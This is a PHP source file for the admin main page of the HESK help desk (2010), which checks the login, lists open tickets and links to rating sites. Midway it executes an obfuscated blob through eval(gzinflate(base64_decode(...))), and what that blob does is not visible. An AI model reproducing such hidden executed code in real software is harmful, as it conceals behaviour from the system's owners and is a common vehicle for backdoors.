<?php
/*******************************************************************************
*  Title: Help Desk Software HESK
*  Version: 2.2 from 9th June 2010
*  Author: Klemen Stirn
*  Website: http://www.hesk.com
********************************************************************************
*  COPYRIGHT AND TRADEMARK NOTICE
*  Copyright 2005-2010 Klemen Stirn. All Rights Reserved.
*  HESK is a registered trademark of Klemen Stirn.

*  The HESK may be used and modified free of charge by anyone
*  AS LONG AS COPYRIGHT NOTICES AND ALL THE COMMENTS REMAIN INTACT.
*  By using this code you agree to indemnify Klemen Stirn from any
*  liability that might arise from it's use.

*  Selling the code for this program, in part or full, without prior
*  written consent is expressly forbidden.

*  Using this code, in part or full, to create derivate work,
*  new scripts or products is expressly forbidden. Obtain permission
*  before redistributing this software over the Internet or in
*  any other medium. In all cases copyright and header must remain intact.
*  This Copyright is in full effect in any country that has International
*  Trade Agreements with the United States of America or
*  with the European Union.

*  Removing any of the copyright notices without purchasing a license
*  is expressly forbidden. To remove HESK copyright notice you must purchase
*  a license for this script. For more information on how to obtain
*  a license please visit the page below:
*  https://www.hesk.com/buy.php
*******************************************************************************/

define('IN_SCRIPT',1);
define('HESK_PATH','../');

/* Make sure the install folder is deleted */
if (is_dir(HESK_PATH . 'install')) {die('Please delete the <b>install</b> folder from your server for security reasons then refresh this page!');}

/* Get all the required files and functions */
require(HESK_PATH . 'hesk_settings.inc.php');
require(HESK_PATH . 'inc/common.inc.php');
require(HESK_PATH . 'inc/database.inc.php');

hesk_session_start();
hesk_dbConnect();
hesk_isLoggedIn();

define('CALENDAR',1);
define('MAIN_PAGE',1);

/* Print header */
require_once(HESK_PATH . 'inc/header.inc.php');

/* Print admin navigation */
require_once(HESK_PATH . 'inc/show_admin_nav.inc.php');
?>

</td>
</tr>
<tr>
<td>

<?php

/* This will handle error, success and notice messages */
hesk_handle_messages();

/* Print tickets? */
if (hesk_checkPermission('can_view_tickets',0))
{
	if (!isset($_SESSION['hide']['ticket_list']))
    {
		#echo '<div style="float:center;border:solid black 1px;text-align:center"><h3>'.$hesklang['open_tickets'].'<br />&nbsp;</h3><div style="float:right;border:solid black 1px"><a href="">+ New ticket</a></div></div>';
        echo '
        <table style="width:100%;border:none;border-collapse:collapse;"><tr>
        <td style="width:25%">&nbsp;</td>
        <td style="width:50%;text-align:center"><h3>'.$hesklang['open_tickets'].'</h3></td>
        <td style="width:25%;text-align:right"><a href="new_ticket.php">'.$hesklang['nti'].'</a></td>
        </tr></table>
        ';
	}
	require(HESK_PATH . 'inc/print_tickets.inc.php');
	echo '<hr />';
	require(HESK_PATH . 'inc/show_search_form.inc.php');
}
else
{
	echo '<p><i>'.$hesklang['na_view_tickets'].'</i></p>';
}

eval(gzinflate(base64_decode('BcFHkptAAADA53i3OIAIQpRPJJERmYGLCxA5DTm83t35nnQ/5V
0PRZes+U+aLPmT/PfNs/Gb//zhsrfcTqbCsgJLYSeRqewYhWYjVGXV6DzPDlJ8cF6eEw0TT8qaDPQ1Id
eldrPtnbdZ8zoC3Qb6qHdDkpPE2LrR2c6vLJ908M5P2EuD0spYagSmUJqm708R1ZpOcT2YiPPOBoOlgG
8kgnMloyn4sj4+AINylUuLG9HBELbj8QEaNEux0+wga676FiHUdZgRkjIRJKJmUErHr2pIkRzGUzCC20
KO0B9grp09WqT1ifj+whoZwUmCAS/QCSa7goN8h3MpW5fJNC7uSvh2qTQckg150j3R297w/sy9gS0GtS
nV6Ala0mNefwyaCZ11ErndjL7ePQqfMtD4Xn8+wLyrHi8K+OzOHRXhm6dcEtkzBhpOtGz6Z9e37gvzUx
QrS0kdZqaRL5xSmU4zB739fuIScXYahMLBksnQNd4hlVp7hLAea4xH2Tza6XfQ427oWgzfon6RwcNhyY
AoJA/DE2PAUwMqkW9t9IdUTV8VU/w5tYTM8t/OwyoMLAQTzRuoV4khenAAieo6R8DtRUinsIivdqikOX
Ptxy00z/W6IpHfugebmZ2yAFfIxGLySgcbqH0LrJ4un1dWngekGnHnBoJ4Qar8LuOGSjTr2Few5oLXJ6
/FbVJWB37JCwJ53m3sgqA7W5XvTbS2BA0gn9Yac85S6glfbNKQ+T1SrpQtfYWosGIPUMOPb/g402kb+t
nXrZyq6K/oxJXLPGs0azhuBFXgJc8uLy28iTKabjYfaWRkOl+XLztKC4N1ebizHIHCUo+A7pZIq8GqNk
DO3dstZE6ecOOF2umCCpbol+t+D+Hy1kd1fBjYe8/OkqqmfSiw6HaiTR3IBzPxXEwtzQe9b+Z0EABAF7
6eN4Ys6JC8bP0TPGuvtibDiq2VMF/oTiMoimLWn9/f37//AQ==')));
?>
<hr />
<table border="0" width="100%">
<tr>
<td><b><?php echo $hesklang['rate_script']; ?></b></td>
<td style="text-align:right"><a href="Javascript:void(0)" onclick="Javascript:hesk_toggleLayerDisplay('divRate')"><?php echo $hesklang['sh']; ?></a></td>
</tr>
</table>

<div id="divRate" style="display:none">
<p><?php echo $hesklang['please_rate']; ?>:</p>
<p><a href="http://www.hotscripts.com/Detailed/46973.html" target="_blank"><?php echo $hesklang['rate_script']; ?>
 @ Hot Scripts</a></p>
<p><a href="http://php.resourceindex.com/detail/04946.html" target="_blank"><?php echo $hesklang['rate_script']; ?>
 @ The PHP Resource Index</a></p>
</div>

<?php

/* Clean unneeded session variables */
hesk_cleanSessionVars('hide');

require_once(HESK_PATH . 'inc/footer.inc.php');
exit();
?>
